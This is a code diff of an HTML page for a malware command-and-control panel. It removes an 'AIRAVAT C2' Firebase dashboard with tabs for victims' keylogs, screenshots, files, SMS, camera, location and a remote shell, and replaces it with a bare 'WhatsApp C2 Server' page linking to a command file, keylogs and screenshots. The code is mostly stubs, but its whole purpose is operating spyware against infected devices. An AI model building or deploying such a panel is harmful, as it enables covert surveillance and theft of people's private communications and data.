@@ -1,63 +1,7 @@
 <!DOCTYPE html>
-<html>
-<head>
-<title>AIRAVAT C2 - VYPERVIC Dashboard</title>
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
-<!-- YOUR FIREBASE CONFIG HERE -->
-<script>
-const firebaseConfig = {
-  // EDIT YOUR PROJECT ID HERE
-  databaseURL: "https://your-project.firebaseio.com/"
-};
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
-</script>
-<style>/* AIRAVAT CSS - DARK THEME */</style>
-</head>
-<body>
-<div class="dashboard">
-  <!-- DEVICES LIST -->
-  <div id="devices"></div>
-  
-  <!-- ACTIVE DEVICE PANEL -->
-  <div id="panel">
-    <h2 id="deviceName">Select Device</h2>
-    
-    <!-- TABS -->
-    <div class="tabs">
-      <button onclick="showTab('keys')">Keylog</button>
-      <button onclick="showTab('screenshots')">Screenshots</button>
-      <button onclick="showTab('files')">Files</button>
-      <button onclick="showTab('sms')">SMS</button>
-      <button onclick="showTab('camera')">Camera</button>
-      <button onclick="showTab('location')">Location</button>
-      <button onclick="showTab('shell')">Shell</button>
-    </div>
-    
-    <!-- CONTENT AREAS -->
-    <div id="keys" class="tab-content">
-      <pre id="keylog"></pre>
-    </div>
-    <div id="screenshots" class="tab-content">
-      <img id="latestScr" style="max-width:100%">
-    </div>
-    <!-- ... other tabs -->
-  </div>
-</div>
-
-<script>
-// LIVE DATA SYNC
-db.ref('devices').on('value', snapshot => {
-  // Parse incoming ?d=DATA
-  // Display keys, screenshots, files, GPS, etc.
-  // Send commands back via Firebase
-});
-
-// COMMAND SENDER
-function sendCommand(cmd) {
-  // Push to Firebase realtime commands
-}
-</script>
-</body>
-</html>
+<html><body>
+<h1>WhatsApp C2 Server</h1>
+<a href="cmd.txt">Current Command</a><br>
+<a href="keylogs.txt">Keylogs</a><br>
+<a href="screenshots/">Screenshots</a>
+</body></html>
